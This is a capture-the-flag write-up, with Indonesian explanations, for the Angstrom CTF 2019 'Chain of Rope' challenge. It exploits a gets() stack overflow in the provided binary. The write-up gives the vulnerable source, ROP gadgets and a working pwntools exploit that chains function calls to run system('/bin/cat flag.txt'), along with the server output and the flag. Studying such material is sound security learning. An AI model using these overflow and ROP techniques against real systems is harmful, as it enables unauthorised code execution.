# __Angstrom CTF 2019__ 
## _Chain of Rope_

## Information
**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
Binary | 80 | l0l

**Description:** 

> 80 points 222 solves
>
> defund found out about this cool new dark web browser! While he was browsing the dark web he came across this service that sells rope chains on the black market, but they're super overpriced! He managed to get the source code. Can you get him a rope chain without paying?
>
> nc shell.actf.co 19400
>
> Author: Aplet123
>
> Given : [binary](./chain_of_rope) and [source](./chain_of_rope.c)

### Chain of Rope
```
chain_of_rope: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d4c22998218e85daf31fb0739fe4b630d57f6241, not stripped

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

```
gdb-peda$ info func
...
0x0000000000401196  authorize
0x00000000004011ab  addBalance
0x00000000004011eb  flag
0x0000000000401252  getInfo
0x0000000000401278  main
...
```

### Chain of Rope Source Code
```c
...
int userToken = 0;
int balance = 0;

int authorize () {
	userToken = 0x1337;
	return 0;
}

int addBalance (int pin) {
	if (userToken == 0x1337 && pin == 0xdeadbeef) {
		balance = 0x4242;
	} else {
		printf("ACCESS DENIED\n");
	}
	return 0;
}

int flag (int pin, int secret) {
	if (userToken == 0x1337 && balance == 0x4242 && pin == 0xba5eba11 && secret == 0xbedabb1e) {
		printf("Authenticated to purchase rope chain, sending free flag along with purchase...\n");
		system("/bin/cat flag.txt");
	} else {
		printf("ACCESS DENIED\n");
	}
	return 0;
}

void getInfo () {
	printf("Token: 0x%x\nBalance: 0x%x\n", userToken, balance);
}
...
	if (choice == 1) {
		gets(name);
	...
```

#### Solve
Terlihat ada vulnerability buffer overflow jika kita memilih opsi 1. Salah satu cara solve yang mudah adalah dengan overwrite return address ke bagian `system("/bin/cat flag.txt")` (bypass semua pengecekan) lalu kita akan langsung mendapatkan flagnya.

Cara lain dengan mengikuti alur yang diinginkan pembuat soal yaitu main -> authorize -> addBalance -> flag.
Setelah didisassemble, padding yang kita butuhkan untuk overwrite return address adalah 0x30 + 8 bytes (rbp). 

Ada sedikit masalah karena fungsi addBalance dan flag memerlukan argumen yang diambil dari register edi dan esi.
```
addBalance:
...
   0x00000000004011b3 <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x00000000004011c3 <+24>:    cmp    DWORD PTR [rbp-0x4],0xdeadbeef

flag: 
   0x00000000004011f3 <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x00000000004011f6 <+11>:    mov    DWORD PTR [rbp-0x8],esi
   0x0000000000401213 <+40>:    cmp    DWORD PTR [rbp-0x4],0xba5eba11
   0x000000000040121c <+49>:    cmp    DWORD PTR [rbp-0x8],0xbedabb1e

```
Maka kita perlu cara untuk set register edi dan esi. Dapat dicari dengan `ROPgadget --binary chain_of_rope`.  
Ditemukan 2 gadget yang cukup sesuai : 
```
0x0000000000401403 : pop rdi ; ret
0x0000000000401401 : pop rsi ; pop r15 ; ret
```

### Payload
```
python2 -c "from pwn import p64;print '1\n'+'A'*0x30+'A'*8+p64(0x0000000000401231)" | nc shell.actf.co 19400
```

```py
from pwn import *

authorize = 0x0000000000401196
addBalance = 0x00000000004011ab
flag = 0x00000000004011eb
getInfo = 0x0000000000401252
main = 0x401278
rdi = 0x0000000000401403
rsi = 0x0000000000401401

def overwrite_ret(addr,arg1=0,arg2=0):
	# go to some func then back to main
	payload = '1\n'
	payload += 'A'*0x30+'B'*8
	if arg1!=0:
		payload += p64(rdi)+p64(arg1)
	if arg2!=0:
		payload += p64(rsi)+p64(arg2)+p64(0xffffffffffffffff)
	payload += p64(addr)+p64(main)
	return payload


# overwrite return address to authorize
print overwrite_ret(authorize)
print overwrite_ret(addBalance,0xdeadbeef)
print overwrite_ret(flag,0xba5eba11,0xbedabb1e)
```

```
python2 x.py  | nc shell.actf.co 19400
```


### Result
```
--== ROPE CHAIN BLACK MARKET ==--
LIMITED TIME OFFER: Sending free flag along with any purchase.
What would you like to do?
1 - Set name
2 - Get user info
3 - Grant access
--== ROPE CHAIN BLACK MARKET ==--
LIMITED TIME OFFER: Sending free flag along with any purchase.
What would you like to do?
1 - Set name
2 - Get user info
3 - Grant access
--== ROPE CHAIN BLACK MARKET ==--
LIMITED TIME OFFER: Sending free flag along with any purchase.
What would you like to do?
1 - Set name
2 - Get user info
3 - Grant access
Authenticated to purchase rope chain, sending free flag along with purchase...
actf{dark_web_bargains}
.....
```

### Flag 
actf{dark_web_bargains}